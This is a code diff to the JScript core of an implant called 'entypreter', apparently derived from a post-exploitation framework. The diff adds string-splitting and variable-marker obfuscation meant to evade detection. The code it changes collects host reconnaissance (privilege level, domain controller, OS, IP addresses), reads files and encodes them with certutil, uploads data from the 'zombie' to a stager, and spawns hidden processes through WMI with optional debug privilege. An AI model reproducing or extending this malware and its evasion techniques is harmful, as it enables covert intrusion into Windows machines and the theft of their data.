@@ -17,17 +17,17 @@ entypreter.EXPIRE = "~_EXPIREEPOCH_~";
  * @return void
  */
  //sleep.start
-entypreter.sleep = function(ms, callback)
+entypreter.sleep = function(#ms#, #callback#)
 {
     if (entypreter.isHTA())
     {
-        window.setTimeout(callback, ms);
+        window.setTimeout(#callback#, #ms#);
     }
     else
     {
-        var now = new Date().getTime();
-        while (new Date().getTime() < now + ms);
-        callback();
+        var #now# = new Date().getTime();
+        while (new Date().getTime() < #now# + #ms#);
+        #callback#();
     }
 }
 //sleep.end
@@ -62,7 +62,7 @@ entypreter.exit = function()
 
         try
         {
-            window.open('', '_se'+'lf', '');
+            window.open('', '_se'+'l'+'f', '');
             window.close();
         }
         catch (e)
@@ -80,8 +80,8 @@ entypreter.exit = function()
 
     try
     {
-        var pid = entypreter.process.currentPID();
-        entypreter.process.kill(pid);
+        var #pid# = entypreter.process.currentPID();
+        entypreter.process.kill(#pid#);
     }
     catch (e)
     {
@@ -97,7 +97,7 @@ entypreter.exit = function()
 //isHTA.start
 entypreter.isHTA = function()
 {
-    return typeof(window) !== "undefined";
+    return typeof(window) !== "undef"+"ined";
 }
 //isHTA.end
 
@@ -109,7 +109,7 @@ entypreter.isHTA = function()
  //isWScript.start
 entypreter.isWScript = function()
 {
-    return typeof(WScript) !== "undefined";
+    return typeof(WScript) !== "un"+"defined";
 }
 //isWScript.end
 //uuid.start
@@ -117,12 +117,12 @@ entypreter.uuid = function()
 {
     try
     {
-        function s4()
+        function #s4#()
         {
             return Math.floor((1 + Math.random()) * 0x10000).toString(16).substring(1);
         }
-        return s4() + s4() + '-' + s4() + '-' + s4() + '-' +
-            s4() + '-' + s4() + s4() + s4();
+        return #s4#() + #s4#() + '-' + #s4#() + '-' + #s4#() + '-' +
+            #s4#() + '-' + #s4#() + #s4#() + #s4#();
     }
     catch(e)
     {
@@ -137,8 +137,8 @@ entypreter.user.isElevated = function()
 {
     try
     {
-        var res = entypreter.shell.exec("net pause lanmanserver", "%TEMP%\\"+entypreter.uuid()+".txt");
-        if (res.indexOf("5") == -1)
+        var #res# = entypreter.shell.exec("net p"+"ause lanman"+"server", "%TE"+"MP%\\"+entypreter.uuid()+".txt");
+        if (#res#.indexOf("5") == -1)
             return true;
         else
             return false;
@@ -158,13 +158,13 @@ entypreter.user.OS = function()
         // var colItems = wmi.ExecQuery("SELECT * FROM Win32_OperatingSystem");
         // var enumItems = new Enumerator(colItems);
         // var objItem = enumItems.item();
-        var osver = entypreter.WS.RegRead("HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProductName");
-        var #osbuild# = entypreter.WS.RegRead("HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\CurrentBuildNumber");
-        return osver+"***"+#osbuild#;
+        var #osver# = entypreter.WS.RegRead("HK"+"LM\\SOFTWARE\\Micr"+"osoft\\Windows NT\\CurrentVers"+"ion\\ProductName");
+        var #osbuild# = entypreter.WS.RegRead("H"+"KLM\\SOFTWARE\\Micros"+"oft\\Windo"+"ws NT\\CurrentVersion\\Curren"+"tBuildNumber");
+        return #osver#+"***"+#osbuild#;
     }
     catch(e){}
 
-    return "Unknown";
+    return "Unkno"+"wn";
 }
 //user.OS.end
 //user.DC.start
@@ -172,18 +172,18 @@ entypreter.user.DC = function()
 {
     try
     {
-        var DC = entypreter.WS.RegRead("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History\\DCName");
-        if (DC.length > 0)
+        var #DC# = entypreter.WS.RegRead("HKLM\\SOFT"+"WARE\\Microsoft\\Win"+"dows\\CurrentVersion\\Group "+"Policy\\History\\DC"+"Name");
+        if (#DC#.length > 0)
         {
             //DC += "___" + entypreter.WS.RegRead("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History\\MachineDomain")
             //DC += entypreter.user.ParseDomainAdmins(entypreter.shell.exec("net group \"Domain Admins\" /domain", "%TEMP%\\das.txt"));
-            return DC;
+            return #DC#;
         }
     }
     catch(e)
     {
     }
-    return "Unknown";
+    return "Un"+"known";
 
 }
 //user.DC.end
@@ -224,12 +224,12 @@ entypreter.user.Arch = function()
 
         // var enumItems = new Enumerator(colItems);
         // var objItem = enumItems.item();
-        var arch = entypreter.WS.RegRead("HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment\\PROCESSOR_ARCHITECTURE");
-        return arch;
+        var #arch# = entypreter.WS.RegRead("HK"+"LM\\SY"+"STEM\\CurrentControlSet\\Contr"+"ol\\Sessi"+"on Manager\\Environment\\PROCESSO"+"R_ARCHITECTURE");
+        return #arch#;
     }
     catch(e){}
 
-    return "Unknown";
+    return "Unk"+"nown";
 }
 //user.Arch.end
 //user.CWD.start
@@ -237,8 +237,8 @@ entypreter.user.CWD = function()
 {
     try
     {
-        var cwd = entypreter.shell.exec("cd", "%TEMP%\\cwd.txt");
-        return cwd;
+        var #cwd# = entypreter.shell.exec("c"+"d", "%TE"+"MP%\\"+entypreter.uuid()+".txt");
+        return #cwd#;
     }
     catch(e)
     {}
@@ -294,35 +294,35 @@ entypreter.user.IPAddrs = function()
 
     try
     {
-        var routeprint4 = entypreter.shell.exec("route PRINT", "%TEMP%\\"+entypreter.uuid()+".txt");
-        var res = routeprint4.split("\r\n");
-        for (var i=0; i < res.length; i++)
+        var #routeprint4# = entypreter.shell.exec("route PRINT", "%TEMP%\\"+entypreter.uuid()+".txt");
+        var #res# = #routeprint4#.split("\r\n");
+        for (var i=0; i < #res#.length; i++)
         {
-            line = res[i].split(" ");
+            #line# = #res#[i].split(" ");
             // count how many 0.0.0.0 entries in this array
-            zerocount = 0;
+            #zerocount# = 4-4;
             // count how many entries in this array aren't empty
-            itemcount = 0;
+            #itemcount# = 9-9;
             // flag for when this is the line we're looking for
-            correctflag = false;
-            for (var j=0; j < line.length; j++)
+            #correctflag# = false;
+            for (var j=0; j < #line#.length; j++)
             {
                 // empty string evals to false
-                if (line[j])
+                if (#line#[j])
                 {
-                    itemcount += 1;
+                    #itemcount# += 6-5;
                     // ip addr is in the 4th column
-                    if (itemcount == 4 && correctflag) {
-                        return line[j];
+                    if (#itemcount# == 2+2 && #correctflag#) {
+                        return #line#[j];
                     }
                 }
-                if (line[j] == "0.0.0.0")
+                if (#line#[j] == "0."+"0.0.0")
                 {
-                    zerocount += 1;
+                    #zerocount# += 9-8;
                     // 2 occurances of the 'any' interface in a single line is what we're looking for
-                    if (zerocount == 2)
+                    if (#zerocount# == 1+1)
                     {
-                        correctflag = true;
+                        #correctflag# = true;
                     }
                 }
             }
@@ -337,34 +337,34 @@ entypreter.user.IPAddrs = function()
 //user.info.start
 entypreter.user.info = function()
 {
-    var net = new ActiveXObject("WScript.Network");
-    var domain = "";
-    if (net.UserDomain.length != 0)
+    var #net# = new ActiveXObject("WSc"+"ript.Net"+"work");
+    var #domain# = "";
+    if (#net#.UserDomain.length != 0)
     {
-        domain = net.UserDomain;
+        #domain# = #net#.UserDomain;
     }
     else
     {
-        domain = entypreter.shell.exec("echo %userdomain%", "%TEMP%\\"+entypreter.uuid()+".txt");
-        domain = domain.split(" \r\n")[0];
+        #domain# = entypreter.shell.exec("echo %us"+"erdomain%", "%TE"+"MP%\\"+entypreter.uuid()+".txt");
+        #domain# = #domain#.split(" \r\n")[0];
     }
-    var info = domain + "\\" + net.Username;
+    var #info# = #domain# + "\\" + #net#.Username;
 
     if (entypreter.user.isElevated())
-        info += "*";
+        #info# += "*";
 
-    var bypassio = net.ComputerName;
+    var #bypassio# = #net#.ComputerName;
 
-    info += "~~~" + bypassio;
-    info += "~~~" + entypreter.user.OS();
-    info += "~~~" + entypreter.user.DC();
-    info += "~~~" + entypreter.user.Arch();
-    info += "~~~" + entypreter.user.CWD();
-    info += "~~~" + entypreter.user.IPAddrs();
-    info += "~~~" + entypreter.user.encoder();
-    info += "~~~" + entypreter.user.shellchcp();
+    #info# += "~"+"~~" + #bypassio#;
+    #info# += "~~"+"~" + entypreter.user.OS();
+    #info# += "~"+"~~" + entypreter.user.DC();
+    #info# += "~~"+"~" + entypreter.user.Arch();
+    #info# += "~"+"~~" + entypreter.user.CWD();
+    #info# += "~~"+"~" + entypreter.user.IPAddrs();
+    #info# += "~"+"~~" + entypreter.user.encoder();
+    #info# += "~~"+"~" + entypreter.user.shellchcp();
 
-    return info;
+    return #info#;
 }
 //user.info.end
 //user.encoder.start
@@ -513,12 +513,13 @@ entypreter.http.create = function()
     {
         http = new ActiveXObject("Msxml2.ServerXMLHTTP.6.0");
         http.setTimeouts(0, 0, 0, 0);
+
         //http = new ActiveXObject("Microsoft.XMLHTTP");
     }
     catch (e)
     {
         http = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
-        http.setTimeouts(30000, 30000, 30000, 0)
+        http.setTimeouts(30000, 30000, 30000, 0);
     }
 
     return http;
@@ -540,9 +541,13 @@ entypreter.http.addHeaders = function(http, headers)
     }
 
     if (!content)
+    {
         http.setRequestHeader("Content-Type", "application/octet-stream");
+    }
 
-    http.setRequestHeader("encoder", entypreter.user.encoder())
+    http.setRequestHeader("encoder", entypreter.user.encoder());
+    http.setRequestHeader("shellchcp", entypreter.user.shellchcp());
+    return;
 }
 //http.addHeaders.end
 
@@ -555,9 +560,9 @@ entypreter.http.post = function(url, data, headers)
 
     http.open("POST", url, false);
     entypreter.http.addHeaders(http, headers);
-    //alert("---Making request---\n" + url + '\n' + "--Data--\n" + data);
+    // alert("---Making request---\n" + url + '\n' + "--Data--\n" + data);
     http.send(data);
-    //alert("---Response---\n" + http.responseText)
+    // alert("---Response---\n" + http.responseText)
     return http;
 }
 //http.post.end
@@ -574,7 +579,7 @@ entypreter.http.get = function(url, headers)
 //http.get.end
 
 /**
- * Upload a file, off session, to stager
+ * Upload a file, off zombie, to stager
  *
  * @param filepath - the full path to the file to send
  * @param header_uuid - a unique identifier for this file
@@ -587,7 +592,6 @@ entypreter.http.get = function(url, headers)
 entypreter.http.upload = function(filepath, header_uuid, certutil, header_key)
 {
     var key = (typeof(header_key) !== "undefined") ? header_key : "ETag";
-
     var headers = {};
     headers[key] = header_uuid;
 
@@ -754,6 +758,32 @@ entypreter.process.list = function()
 }
 //process.list.end
 
+//process.getPID.start
+entypreter.process.getPID = function(process_name)
+{
+    var processes = entypreter.process.list();
+
+    var items = new Enumerator(processes);
+    while (!items.atEnd())
+    {
+        var proc = items.item();
+
+        try
+        {
+            if (proc.Name == process_name)
+            {
+                return proc.ProcessId;
+            }
+        } catch (e)
+        {
+        }
+        items.moveNext();
+    }
+
+    return false;
+}
+//process.getPID.end
+
 // http://apidock.com/ruby/Win32/Registry/Constants
 //registry.start
 entypreter.registry = {};
@@ -875,12 +905,22 @@ entypreter.registry.create = function(hiveKey, path, key, computer)
 entypreter.WMI = {};
 
 //WMI.createProcess.start
-entypreter.WMI.createProcess = function(cmd)
+entypreter.WMI.createProcess = function(cmd, #dpriv#)
 {
+
     var SW_HIDE = 0;
     var pid = 0;
 
-    var wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2")
+    var #dpriv# = (typeof(#dpriv#) !== "undefined") ? #dpriv# : false;
+
+    var #part1# = "winmgmts:{impersonationLevel=impersonate";
+    if (#dpriv#)
+    {
+        #part1# += ", (DEBUG)";
+    }
+    var #part2# = "}!\\\\.\\root\\cimv2";
+
+    var wmi = GetObject(#part1#+#part2#);
 
     var si = wmi.Get("Win"+"32_ProcessStartup").SpawnInstance_();
     si.ShowWindow = SW_HIDE;
@@ -963,10 +1003,21 @@ entypreter.file.readText = function(path)
     {
         if (entypreter.FS.FileExists(entypreter.file.getPath(path)) && entypreter.FS.GetFile(entypreter.file.getPath(path)).Size > 0)
         {
-            var fd = entypreter.FS.OpenTextFile(entypreter.file.getPath(path), 1, false, 0);
-            var data = fd.ReadAll();
-            fd.Close();
-            return data;
+            try
+            {
+                var fd = entypreter.FS.OpenTextFile(entypreter.file.getPath(path), 1, false, 0);
+                var data = fd.ReadAll();
+                fd.Close();
+                return data;
+            }
+            catch (e)
+            {
+                // if the file is too big, certutil won't be able to write everything in time
+                // and we run into a permissions error on read. we just need it to finish writing
+                // before we can read it.
+                entypreter.shell.run("ping 127."+"0.0.1 -n 2", false);
+                continue;
+            }
         }
         else
         {
@@ -984,7 +1035,7 @@ entypreter.file.readText = function(path)
 entypreter.file.readBinary = function(path, exists, certutil)
 {
     var exists = (typeof(exists) !== "undefined") ? exists : false;
-    var certutil = (typeof(exists) !== "undefined") ? certutil : false;
+    var certutil = (typeof(certutil) !== "undefined") ? certutil : false;
 
     if (!entypreter.FS.FileExists(entypreter.file.getPath(path)) && exists)
     {
@@ -1003,7 +1054,6 @@ entypreter.file.readBinary = function(path, exists, certutil)
             if (entypreter.user.encoder() == "936" || certutil)
             {
                 var newout = "%TEMP%\\"+entypreter.uuid()+".t"+"xt";
-                entypreter.shell.run("whoami");
                 entypreter.shell.run("certut"+"il -encode "+entypreter.file.getPath(path)+" "+newout);
                 var data = entypreter.file.readText(newout);
                 entypreter.file.deleteFile(newout);
